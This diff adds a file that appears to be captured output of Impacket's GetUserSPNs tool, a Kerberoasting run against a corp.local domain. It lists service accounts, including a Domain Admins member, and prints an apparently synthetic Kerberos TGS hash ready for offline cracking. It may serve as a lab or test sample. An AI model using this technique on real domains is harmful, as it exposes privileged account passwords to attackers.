@@ -1,0 +1,10 @@
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+[*] Getting machine hostname
+ServicePrincipalName            Name       MemberOf                                                        PasswordLastSet             LastLogon                   Delegation
+------------------------------  ---------  --------------------------------------------------------------  --------------------------  --------------------------  ----------
+HTTP/web01.corp.local           svc_web    CN=IT Admins,OU=Groups,DC=corp,DC=local                         2024-09-03 11:22:41.113321  2026-09-16 08:41:05.552210
+MSSQLSvc/db01.corp.local:1433   svc_sql    CN=Domain Admins,CN=Users,DC=corp,DC=local                      2023-04-19 15:07:33.884210  2026-09-15 22:10:47.119002
+
+[-] CCache file is not found. Skipping...
+$krb5tgs$23$*svc_sql$CORP.LOCAL$MSSQLSvc/db01.corp.local:1433*$8f2a4c6e8b0d1f3a5c7e9b1d3f5a7c9e$d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a0c2e4b6d8f0a2c4e6b8d0f2a4c6e8b0d2f4a6c8e0b2d4f6a8c0e2b4d6f8a1c3e5b7d9f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e0b2d4f6a8c1e3b5d7f9a0c2e4b6d8f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e1b3d5f7a9c0e2b4d6f8a0c2e4b6d8f1a3c5e7b9d0f2a4c6e8b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a1c3e5b7d9f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e0b2d4f6a8c1e3b5d7f9a0c2e4b6d8f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e1b3d5f7a9c0e2b4d6f8a0c2e4b6d8f1a3c5e7b9d0f2a4c6e8b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a1c3e5b7d9f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e0b2d4f6a8c1e3b5d7f9a0c2e4b6d8f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e1b3d5f7a9c0e2b4d6f8a0c2e4b6d8f1a3c5e7b9d0f2a4c6e8b0d2f4a6c8e0b1d3f5a7c9e1b3d5f7a9c0e2b4d6f8a1c3e5b7d9f0a2c4e6b8d0f1a3c5e7b9d1f3a5c7e9b0d2f4a6c8e0b2d4f6a8c1e3b5d7f9a0c2e4b6d8f0a2c4e6b8d0
